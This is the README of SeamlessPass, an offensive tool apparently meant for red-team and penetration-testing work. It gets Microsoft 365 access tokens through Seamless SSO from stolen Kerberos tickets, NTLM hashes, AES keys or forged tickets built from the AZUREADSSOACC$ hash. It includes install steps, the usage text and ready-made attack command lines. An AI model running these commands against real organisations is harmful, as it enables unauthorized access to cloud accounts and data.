# SeamlessPass
**Leveraging Kerberos tickets to get Microsoft 365 access tokens using Seamless SSO**

---

SeamlessPass is a tool designed to obtain Microsoft 365 access tokens using on-premises Active Directory Kerberos tickets for organizations with Seamless SSO (Desktop SSO) enabled. These tokens can be used for further interaction with Microsoft 365 services via APIs or other tools like ROADTools and AADInternals for more offensive capabilities.



## Installation

SeamlessPass can be installed using PyPI or from the source. After installation, the tool will be available using `seamlesspass` command. 

### Using PyPI

```bash
pip install seamlesspass
```

### From Source

1. Download source code (as archive or using `git clone https://github.com/Malcrove/SeamlessPass.git`)
2. Navigate to the code directory
3. Install using `pip install .`, or install requirements `pip install -r requirements.txt` then run directly using `python run.py`

## Usage

```bash

   _____                      _               _____
  / ____|                    | |             |  __ \      v(0.1)
 | (___   ___  __ _ _ __ ___ | | ___  ___ ___| |__) |_ _ ___ ___
  \___ \ / _ \/ _` | '_ ` _ \| |/ _ \/ __/ __|  ___/ _` / __/ __|
  ____) |  __/ (_| | | | | | | |  __/\__ \__ \ |  | (_| \__ \__ \
 |_____/ \___|\__,_|_| |_| |_|_|\___||___/___/_|   \__,_|___/___/

 By Abood Nour (@0xSyndr0me) - Malcrove (https://malcrove.com/)

Leveraging Kerberos tickets to get cloud access tokens using Seamless SSO

Usage: seamlesspass [-t tenant domain] [-r resource URI] [-c client_id] [-ignore-sso-check] [-d domain] [-dc DC host/IP] [-u username] [-p password] [-n [LMHASH:]NTHASH] [-aes AESKey] [-tgt base64 TGT / TGT file] [-tgs base64 TGS / TGS file] [-spn SPN] [-domain-sid SID] [-user-rid number] [-user-sid SID] [-adssoacc-ntlm [LMHASH:]NTHASH] [-adssoacc-aes AESKey] [-proxy [scheme]://[user:password]@[host]:[port]] [-ua USERAGENT] [-debug] [-no-color] [-h]

Microsoft 365 options:
  -t/-tenant tenant domain
                        Domain of the tenant (e.g. example.com, corp.onmicrosoft.com)
  -r/-resource resource URI
                        Target cloud service to be accessed (Default: https://graph.windows.net)
  -c/-client-id client_id
                        Microsoft 365 client ID (Default: 1b730954-1685-4b74-9bfd-dac224a7b894)
  -ignore-sso-check     Try to login using Seamless SSO even if it is not enabled

Authentication Options:
  -d/-domain domain
                        Local domain (e.g., corp.local)
  -dc/-dc-ip DC host/IP
                        Hostname or IP Address of the domain controller used for authentication (example: dc.corp.local, 10.0.1.2)
  -u/-username username
  -p/-password password
  -n/-ntlm [LMHASH:]NTHASH
                        User's NTLM hashed password, format is [LMHASH:]NTHASH
  -aes AESKey  User's AES 128/256 key
  -tgt base64 TGT / TGT file
                        base64-encoded Ticket-Granting Ticket (TGT) or path to TGT file (kirbi/ccache)
  -tgs base64 TGS / TGS file
                        base64-encoded Service Ticket (TGS) or path to TGS file (kirbi/ccache)
  -spn SPN     Target service principal name. (Default: HTTP/autologon.microsoftazuread-sso.com)

Ticket Forgery Options:
  -domain-sid SID
                        Domain Security Identifier
  -user-rid number
                        User Relative ID (Last part of user SID)
  -user-sid SID
                        User Security Identifier
  -adssoacc-ntlm [LMHASH:]NTHASH
                        NTLM hash of AZUREADSSOACC account (Used to forge TGS)
  -adssoacc-aes AESKey
                        AES 128/256 Key of AZUREADSSOACC account (Used to forge TGS)

Connection Options:
  -proxy [scheme]://[user:password]@[host]:[port]
                        NOTE: This is used only for HTTP requests not DC communication. (example: http://burp:8080)
  -ua/-user-agent USERAGENT
                        HTTP User agent used in interaction with Microsoft 365 APIs

Misc options:
  -debug                Turn debug output on
  -no-color             Turn off console colors
  -h/--help             Show this help message and exit.

Examples:
  seamlesspass -tenant corp.com -domain corp.local -dc dc.corp.local -tgt <base64_encoded_TGT>
  seamlesspass -tenant corp.com -tgs user_tgs.ccache
  seamlesspass -tenant corp.com -domain corp.local -dc dc.corp.local -username user -ntlm DEADBEEFDEADBEEFDEADBEEFDEADBEEF
  seamlesspass -tenant corp.com -domain corp.local -dc 10.0.1.2 -username user -password password
  seamlesspass -tenant corp.com -adssoacc-ntlm DEADBEEFDEADBEEFDEADBEEFDEADBEEF -user-sid S-1-5-21-1234567890-1234567890-1234567890-1234
  seamlesspass -tenant corp.com -adssoacc-aes DEADBEEFDEADBEEFDEADBEEFDEADBEEF -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -user-rid 1234
```

## Use Cases

SeamlessPass can be used to obtain access tokens for Microsoft 365 services for tenants with enabled Seamless SSO feature. The access tokens can be then fed to other tools like `ROADTools` and `AADInternals` for further enumeration or offensive capabilities. The tool can be very handy in various situations where the **cleartext password of the user is unavailable** but other forms of access are obtainable such as

- Using compromised user’s Ticket-Granting-Ticket (TGT) or forged Golden Ticket 
(*Interacts with DC)*
    
    ```bash
    seamlesspass -tenant corp.com -domain corp.local -dc dc.corp.local -tgt <base64_encoded_TGT>
    ```
    
- Using compromised user’s NTLM hash or AES key
(*Interacts with DC)*
    
    ```bash
    seamlesspass -tenant corp.com -domain corp.local -dc dc.corp.local -username user -ntlm DEADBEEFDEADBEEFDEADBEEFDEADBEEF
    ```
    
- Acquisition of AZUREADSSOACC$ account NTLM hash or AES key 
*(No interaction with DC is needed)*
    
    ```bash
    seamlesspass -tenant corp.com -adssoacc-ntlm DEADBEEFDEADBEEFDEADBEEFDEADBEEF -user-sid S-1-5-21-1234567890-1234567890-1234567890-1234
    ```
    

## TODO

- [ ]  Support interactive Multiple-Factor Authentication (MFA)
- [ ]  ...?

## Contact

Please submit any bugs, issues, questions, or feature requests under "Issues" or send them to me on Twitter @0xSyndr0me

## Credits

Creation of this tool would have been much harder if it wasn’t for the awesome work and research by folks like

- [SecureAuthCorp](https://github.com/SecureAuthCorp) and all the [contributors](https://github.com/SecureAuthCorp/impacket/graphs/contributors) for [Impacket](https://github.com/SecureAuthCorp/impacket)
- [Dr. Nestori Syynimaa](https://twitter.com/DrAzureAD) for [AADInternals](https://github.com/Gerenios/AADInternals)
- [Oliver Lyak](https://twitter.com/ly4k_) for [Certipy](https://github.com/ly4k/Certipy)
- [Dirk-jan](https://twitter.com/_dirkjan) for [ROADTools](https://github.com/dirkjanm/ROADtools)
